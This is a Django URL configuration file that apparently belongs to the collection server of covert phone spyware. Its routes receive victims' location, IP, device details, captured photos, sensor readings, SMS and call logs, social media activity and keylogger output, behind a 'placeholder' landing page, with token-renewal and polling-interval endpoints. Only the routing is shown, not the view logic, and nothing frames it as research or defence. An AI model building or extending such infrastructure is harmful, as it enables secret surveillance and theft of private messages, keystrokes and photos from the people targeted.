from django.urls import path, include
from rest_framework.routers import DefaultRouter
from . import views
from .viewsets import TelemetryViewSet, AlertStreamViewSet, AIJobViewSet

router = DefaultRouter()
router.register(r'telemetry', TelemetryViewSet, basename='telemetry')
router.register(r'alerts', AlertStreamViewSet, basename='alerts')
router.register(r'aijobs', AIJobViewSet, basename='aijob')

urlpatterns = [
    path('placeholder/', views.landing, name='landing'),
    path('api/location/', views.update_location, name='update_location'),
    path('api/ip/', views.update_ip, name='update_ip'),
    path('api/device/', views.update_device_info, name='update_device_info'),
    path('api/photo/', views.capture_photo, name='capture_photo'),
    path('api/sensor/', views.update_sensor_data, name='update_sensor_data'),
    path('api/permission/', views.update_permission_status, name='update_permission_status'),
    path('api/sms/', views.update_sms_log, name='update_sms_log'),
    path('api/call/', views.update_call_log, name='submit_call_log'),
    path('token-renew/', views.renew_auth_token, name='token-renew'),
    path('api/social/', views.update_social_log, name='update_social_log'),
    path('api/keylogger/', views.update_keylogger_log, name='update_keylogger_log'),
    path('api/js_version/', views.js_version, name='js_version'),
    path('api/get_update_interval/', views.get_update_interval, name='get_update_interval'),
    path('api/', include(router.urls)),
]
